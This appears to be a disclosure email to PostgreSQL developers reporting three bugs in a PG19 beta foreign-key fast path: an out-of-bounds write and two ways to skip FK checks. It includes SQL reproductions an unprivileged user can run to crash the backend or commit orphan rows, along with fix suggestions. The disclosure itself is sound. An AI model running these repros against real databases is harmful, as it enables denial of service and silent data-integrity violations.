@@ -1,0 +1,187 @@
+Subject: PG19 FK fast path: OOB write and missed FK checks during batched
+ flush
+
+Hackers,
+
+I identified these issues during recent security research.  While they have
+clear security implications (OOB write, integrity bypass), I am reporting
+them directly to -hackers rather than security@ because they are isolated to
+19beta1, absent in PG18 and earlier; I don't have patches, only
+reproducibility.
+
+The new FK existence-check fast path in src/backend/utils/adt/ri_triggers.c
+(ri_FastPath*) runs user-defined code in the middle of a deferred batch
+flush, which yields three defects reachable by an unprivileged table owner.
+Present in master and verified in REL_19_BETA1; absent from REL_18_4 and
+REL_17_6 (PG19-only, so pre-GA, not a security@ matter).
+
+Mechanism.  For an INSERT/UPDATE on the referencing side the fast path
+buffers rows in a transaction-lived cache (ri_fastpath_cache, keyed by
+pg_constraint OID) and probes the PK index in groups, flushing when a
+per-constraint buffer reaches RI_FASTPATH_BATCH_SIZE (64) or when the
+trigger-firing pass ends (ri_FastPathEndBatch, an AfterTriggerBatchCallback).
+For a cross-type FK the flush calls the column's cast function
+(ri_FastPathFlushArray, the FunctionCall3 at line 3069) and the equality
+operator -- arbitrary user code, mid-flush.  Line numbers below are from a
+REL_19_BETA1 build (commit 4b0bf07).
+
+Unprivileged vehicle (defects 1 and 3).  No superuser, no contrib: a role
+creates a type it owns and an IMPLICIT cast from it to the PK type with a
+PL/pgSQL function, which ri_HashCompareOp wires into the fast path's cast
+slot.  Below uses a composite type.  Default btree opclass, ordinary
+single-column FK, no GUC (fast path is unconditional for non-partitioned,
+non-temporal FKs, per ri_fastpath_is_applicable).
+
+
+[1] ri_FastPathBatchAdd (line 2859): out-of-bounds write on re-entry
+
+The write precedes the bound check, and batch_count is reset to 0 only at
+end of flush (ri_FastPathBatchFlush, line 2971), so it is 64 throughout a
+full-batch flush:
+
+    fpentry->batch[fpentry->batch_count] = ExecCopySlotHeapTuple(newslot);
+    fpentry->batch_count++;
+    if (fpentry->batch_count >= RI_FASTPATH_BATCH_SIZE)
+        ri_FastPathBatchFlush(fpentry, fk_rel, riinfo);
+
+There is no re-entrancy guard and ri_FastPathGetEntry returns the same
+entry, so user code that does DML on the same table during a full-batch
+flush re-enters with batch_count == 64 and writes batch[64], one past the
+array, overwriting the adjacent batch_count field (struct layout, lines
+250-251).  A single re-entrant row only stomps batch_count, which is then
+reset to 0 before reuse; the crash manifests once the re-entrant insert is
+itself large enough to fill and flush a batch, so the stomped batch_count is
+used as an array index (batch[garbage]) and as nvals in
+memset(matched, 0, nvals * sizeof(bool)) (line 3054).
+
+Repro (non-superuser; reliable SIGSEGV on --enable-cassert -O0; under -O2
+the out-of-bounds write is of undefined effect, so a clean run there does
+not disprove it):
+
+    create table parent(id int primary key);
+    insert into parent select g from generate_series(1,2000) g;
+    create type vch as (v int);
+    create function vcast(vch) returns int language plpgsql as $$
+    begin
+      if $1.v = 64 then
+        insert into child select row(g)::vch from generate_series(1001,1064) g;
+      end if;
+      return $1.v;
+    end$$;
+    create cast (vch as int) with function vcast(vch) as implicit;
+    create table child(a vch);
+    alter table child add constraint child_fkey
+      foreign key (a) references parent(id);
+    insert into child select row(g)::vch from generate_series(1,64) g;  -- crash
+    -- gdb: crash at ri_FastPathBatchAdd line 2866 with batch_count holding a
+    -- stomped HeapTuple pointer's low bits, i.e. batch[64] overwrote
+    -- batch_count; backend SIGSEGVs and the cluster restarts.
+
+
+[2] ri_FastPathSubXactCallback (line 4208): batch dropped on subxact abort
+
+On SUBXACT_EVENT_ABORT_SUB the callback discards the whole cache:
+
+    ri_fastpath_cache = NULL;
+    ri_fastpath_callback_registered = false;
+
+But batch[] holds outstanding rows of the enclosing transaction, not the
+aborting subxact.  An internal subxact abort during after-trigger firing
+(PL/pgSQL BEGIN ... EXCEPTION) drops the buffered rows unflushed; their FK
+checks never run and orphans commit behind a constraint that still reports
+itself valid.  No cast needed:
+
+    create table pk(id int primary key);
+    create table fk(a int, tag text);
+    insert into pk select g from generate_series(1,10) g;
+    alter table fk add constraint fk_a_fkey foreign key (a) references pk(id);
+    create function abort_subxact() returns trigger language plpgsql as $$
+    begin
+      if NEW.tag = 'boom' then
+        begin perform 1/0; exception when others then null; end;
+      end if;
+      return NEW;
+    end$$;
+    create trigger fk_after after insert on fk
+      for each row execute function abort_subxact();
+    insert into fk values (999,'bad'),(0,'boom'),(1,'ok'),(2,'ok'),(3,'ok');
+    -- INSERT 0 5, no error
+    select f.a from fk f left join pk p on f.a=p.id where p.id is null;
+    --  a
+    -- -----
+    -- 999
+    --   0   (orphans)
+
+    -- the constraint still reports itself valid, and re-validation passes
+    -- while the orphans remain:
+    select convalidated from pg_constraint where conname = 'fk_a_fkey';
+    -- convalidated
+    -- --------------
+    -- t
+    alter table fk validate constraint fk_a_fkey;
+    -- ALTER TABLE   (succeeds; does not re-scan committed rows)
+    select f.a from fk f left join pk p on f.a=p.id where p.id is null;
+    -- 999, 0  (orphans still present)
+
+Controls (no EXCEPTION; between-statement SAVEPOINT; DEFERRABLE INITIALLY
+DEFERRED) all behave correctly (FK violation raised, no orphans).  The whole
+statement's buffered batch is discarded, not just the aborting row's check.
+The abort path also emits "WARNING: resource was not closed" (relation /
+index / TupleDesc), a resource leak consistent with the missing flush.
+
+
+[3] ri_FastPathEndBatch (line 4133): cross-table re-entry drops a check
+
+EndBatch flushes by iterating the cache with hash_seq_search (line 4143).
+If flush-time user code INSERTs into a different fast-path FK table,
+ri_FastPathGetEntry adds a new cache entry mid-scan; it can land in a bucket
+hash_seq_search already passed and is never reached.  ri_FastPathTeardown
+(line 4165) then hash_destroys the cache (line 4188) without flushing entries
+that still have batch_count > 0, so that buffered check is discarded.  This
+survives a
+per-entry guard for [1] (different entry, not a re-entry of the busy one):
+
+    create table parent(id int primary key);
+    insert into parent select g from generate_series(1,64) g;
+    create table child2(a int);
+    alter table child2 add constraint child2_fkey
+      foreign key (a) references parent(id);
+    create type vch as (v int);
+    create function vcast(vch) returns int language plpgsql as $$
+    begin
+      if $1.v = 1 then
+        insert into child2 values (999999);   -- orphan into a *different* FK
+      end if;
+      return $1.v;
+    end$$;
+    create cast (vch as int) with function vcast(vch) as implicit;
+    create table child(a vch);
+    alter table child add constraint child_fkey
+      foreign key (a) references parent(id);
+    insert into child values (row(1)::vch);    -- flushed at ri_FastPathEndBatch
+    select a from child2 where a not in (select id from parent);  -- => 999999
+    -- control: INSERT INTO child2 VALUES (999999); -- correctly raises FK error
+
+
+Root cause and fix directions.
+
+All three stem from invoking user cast/operator code inside a deferred
+batch flush: while a per-entry batch is half-updated [1], while a cache-wide
+hash_seq_search is in progress and teardown drops non-empty entries [3], and
+against a subxact-abort invalidation that cannot tell parent-xact rows from
+aborted-subxact rows [2].
+
+- [1] Bound-check before the write in ri_FastPathBatchAdd, and add a
+  "flushing" flag to RI_FastPathEntry, rejecting re-entrant modification of
+  a busy entry (a nested per-row probe is unsafe: the flush may hold PK-index
+  buffer locks).
+- [3] Loop-flush in ri_FastPathEndBatch until no entry has batch_count > 0,
+  and/or flush non-empty entries in ri_FastPathTeardown before hash_destroy.
+- [2] Do not discard outstanding parent-xact rows on SUBXACT_EVENT_ABORT_SUB;
+  track the buffering subxact, or flush immediate-constraint batches at
+  subxact boundaries.
+- Unifying: a global "in fast-path flush" guard routing any re-entrant FK
+  check to the immediate per-row path, and reconsidering running user code
+  mid-flush at all.
+
+Regards,
